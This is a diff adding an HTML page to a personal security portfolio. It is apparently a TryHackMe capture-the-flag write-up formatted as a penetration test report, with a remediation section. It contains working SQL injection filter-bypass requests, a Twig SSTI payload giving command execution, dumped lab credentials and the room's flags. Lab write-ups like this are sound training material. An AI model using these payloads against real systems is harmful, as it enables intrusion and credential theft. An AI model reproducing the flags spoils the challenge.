@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A penetration test was conducted against the target environment at 10.67.189.74. The assessment identified four security vulnerabilities that, when chained, all">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-medium">Medium</span> <span class="dot">·</span> <span class="date">May 31, 2026</span></p>
+<div class="writeup-content">
+<p><strong>Client:</strong> Injectics Corp   <strong>Assessment Date:</strong> May 31, 2026   <strong>Classification:</strong> CONFIDENTIAL  </p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>A penetration test was conducted against the target environment at 10.67.189.74. The assessment identified four security vulnerabilities that, when chained, allowed an unauthenticated attacker to achieve full remote compromise of the host. Initial access was gained via SQL injection authentication bypass, followed by a second SQL injection that leaked database credentials. Admin panel access revealed a Server-Side Template Injection (SSTI) vulnerability that yielded remote code execution as <code>www-data</code>, exposing sensitive flag files in the web root.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.67.189.74</td>
+</tr>
+<tr>
+<td>Ports in Scope</td>
+<td>22, 80</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>Apache 2.4.41, MySQL (root), PHP (Twig templating)</td>
+</tr>
+<tr>
+<td>Assessment Type</td>
+<td>External penetration test</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>3. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-01</td>
+<td>SQL Injection in Login Form (Authentication Bypass)</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>SQL Injection in Leaderboard Edit (Data Exfiltration)</td>
+<td>8.6</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Server-Side Template Injection (SSTI) in Profile Update</td>
+<td>9.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-04</td>
+<td>Sensitive Flag Files Exposed in Web Root</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>4. Detailed Findings</h2>
+<h3>F-01: SQL Injection in Login Form (Authentication Bypass)</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8)   <strong>Affected Component:</strong> <code>/functions.php</code> — <code>POST username</code> parameter</p>
+<p><strong>Description:</strong>   The login handler at <code>functions.php</code> concatenates unsanitized user input directly into a SQL query. A server-side filter blocks the keywords <code>or</code>, <code>and</code>, <code>union</code>, <code>select</code>, <code>&#x27;</code>, and <code>&quot;</code>, but does not block the <code>||</code> (concatenation/OR) operator, allowing authentication bypass.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>POST /functions.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&#x27; || 1=1 LIMIT 1 OFFSET 1 -- -&amp;password=test&amp;function=login</code></pre>
+<p><strong>Impact:</strong> Unauthenticated remote attacker gains authenticated access as any user in the database.</p>
+<p><strong>Recommendation:</strong> Use parameterized queries (prepared statements) instead of string concatenation. Input validation should reject dangerous characters rather than selectively filtering keywords.</p>
+<hr>
+<h3>F-02: SQL Injection in Leaderboard Edit (Data Exfiltration)</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.6)   <strong>Affected Component:</strong> <code>/edit_leaderboard.php</code> — <code>POST gold</code> parameter</p>
+<p><strong>Description:</strong>   The leaderboard edit functionality directly concatenates user input into an <code>UPDATE</code> SQL statement. A server-side filter strips the keywords <code>SELECT</code>, <code>OR</code>, and <code>AND</code> via a single-pass replacement, which can be bypassed by nesting the keywords (e.g., <code>SESELECTLECT</code> → <code>SELECT</code>, <code>infoORrmation_schema</code> → <code>information_schema</code>, <code>passwoORrd</code> → <code>password</code>). The <code>COUNTRY</code> column can be set to the result of a subquery, allowing data extraction.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<p>Extract database credentials:</p>
+<pre><code>POST /edit_leaderboard.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+rank=1&amp;country=USA&amp;gold=1,country=(SESELECTLECT group_concat(email,&#x27;:&#x27;,passwoORrd) from bac_test.users)&amp;silver=21&amp;bronze=0</code></pre>
+<p>Response from <code>/dashboard.php</code> shows:</p>
+<pre><code>&lt;th scope=&#x27;row&#x27;&gt;1&lt;/th&gt;
+&lt;td&gt;dev@injectics.thm:2342sdsfwf2wr2rf,superadmin@injectics.thm:34234vsdfwr2r2wf2r2&lt;/td&gt;</code></pre>
+<p><strong>Impact:</strong> An authenticated attacker can extract all data from the database, including user passwords. The database user is <code>root@localhost</code> with full privileges including <code>FILE</code>.</p>
+<p><strong>Recommendation:</strong> Use parameterized queries (prepared statements). Apply least-privilege to the MySQL database user.</p>
+<hr>
+<h3>F-03: Server-Side Template Injection (SSTI) in Profile Update</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.8)   <strong>Affected Component:</strong> <code>/update_profile.php</code> — <code>POST fname</code> / <code>lname</code> parameters</p>
+<p><strong>Description:</strong>   The profile update page stores first and last name values that are rendered on the dashboard through the Twig templating engine without sanitization. User-supplied values containing Twig template syntax (<code>{{ }}</code>) are evaluated server-side. The Twig sandbox is enabled but can be bypassed using the <code>sort</code> filter with a PHP function name as a callback when the input array contains at least two elements.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>POST /update_profile.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+email=superadmin@injectics.thm&amp;fname={{[&#x27;id&#x27;,&#x27;&#x27;]|sort(&#x27;passthru&#x27;)}}&amp;lname=</code></pre>
+<p>Response from <code>/dashboard.php</code>:</p>
+<pre><code>Welcome, uid=33(www-data) gid=33(www-data) groups=33(www-data)!</code></pre>
+<p><strong>Impact:</strong> Remote code execution as <code>www-data</code> user. Attacker can execute arbitrary system commands, read sensitive files, and pivot within the environment.</p>
+<p><strong>Recommendation:</strong> Never render user-supplied input through a template engine. Sanitize or escape all user-controlled values displayed on web pages.</p>
+<hr>
+<h3>F-04: Sensitive Flag Files Exposed in Web Root</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5)   <strong>Affected Component:</strong> <code>/var/www/html/flags/</code></p>
+<p><strong>Description:</strong>   Sensitive flag files containing confidential information are stored in a web-accessible directory. While directory listing returns <code>403 Forbidden</code>, the files remain readable by any authenticated user with RCE access.</p>
+<p><strong>Evidence:</strong></p>
+<pre><code>$ ls -la /var/www/html/flags/
+total 12
+drwxrwxr-x 2 ubuntu ubuntu 4096 Jul 18 14:58 .
+drwxr-xr-x 4 ubuntu ubuntu 4096 Jul 18 15:27 ..
+-rw-rw-r-- 1 ubuntu ubuntu   38 Jul 18 14:58 5d[REDACTED]48.txt</code></pre>
+<p><strong>Impact:</strong> Confidential flag data was retrieved (<code>THM{5735172b6c147f4dd649872f73e0fdea}</code>).</p>
+<p><strong>Recommendation:</strong> Store sensitive files outside the web root. If they must be in the web root, implement proper access controls (e.g., <code>.htaccess</code>, authentication middleware).</p>
+<hr>
+<h2>5. Attack Chain Summary</h2>
+<pre><code>Port scan (nmap)
+    │
+    ▼
+/login.php — client-side JS filter bypassed via direct POST
+    │
+    ▼
+/functions.php — SQL injection (|| operator bypasses keyword filter)
+    │
+    ▼
+Authenticated session as dev@injectics.thm
+    │
+    ▼
+/edit_leaderboard.php — SQL injection with SESELECTLECT / infoORrmation_schema bypass
+    │
+    ▼
+Extracted credentials: dev@injectics.thm:2342sdsfwf2wr2rf,
+                       superadmin@injectics.thm:34234vsdfwr2r2wf2r2
+    │
+    ▼
+/adminLogin007.php — Authenticated as superadmin
+    │
+    ▼
+/update_profile.php — SSTI via Twig {{[&#x27;id&#x27;,&#x27;&#x27;]|sort(&#x27;passthru&#x27;)}}
+    │
+    ▼
+RCE as www-data
+    │
+    ▼
+/var/www/html/flags/ — Flag file read (THM{...})</code></pre>
+<hr>
+<h2>6. Remediation Priority</h2>
+<table>
+<thead><tr>
+<th>Order</th>
+<th>Finding</th>
+<th>Action</th>
+</tr></thead><tbody>
+<tr>
+<td>1</td>
+<td>F-01</td>
+<td>Rewrite database queries using prepared statements</td>
+</tr>
+<tr>
+<td>2</td>
+<td>F-03</td>
+<td>Sanitize user input in template rendering; disable PHP functions in Twig sandbox</td>
+</tr>
+<tr>
+<td>3</td>
+<td>F-02</td>
+<td>Apply prepared statements to edit_leaderboard.php; restrict MySQL user privileges</td>
+</tr>
+<tr>
+<td>4</td>
+<td>F-04</td>
+<td>Move flag files outside web root; implement proper access controls</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Appendix: Compromised Credentials</h2>
+<p>The following credentials were compromised during testing and must be rotated immediately:</p>
+<table>
+<thead><tr>
+<th>Account</th>
+<th>Type</th>
+<th>Credential</th>
+</tr></thead><tbody>
+<tr>
+<td>dev@injectics.thm</td>
+<td>Web Application</td>
+<td><code>2342sdsfwf2wr2rf</code></td>
+</tr>
+<tr>
+<td>superadmin@injectics.thm</td>
+<td>Web Application</td>
+<td><code>34234vsdfwr2r2wf2r2</code></td>
+</tr>
+<tr>
+<td>root@localhost</td>
+<td>MySQL</td>
+<td>Password not disclosed by application (no password or auth via socket)</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>8. Flags Recovered</h2>
+<table>
+<thead><tr>
+<th>Flag</th>
+<th>Value</th>
+</tr></thead><tbody>
+<tr>
+<td>Admin Panel Flag</td>
+<td><code>THM{INJECTICS_ADMIN_PANEL_007}</code></td>
+</tr>
+<tr>
+<td>Filesystem Flag</td>
+<td><code>THM{5735172b6c147f4dd649872f73e0fdea}</code></td>
+</tr>
+</tbody></table>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
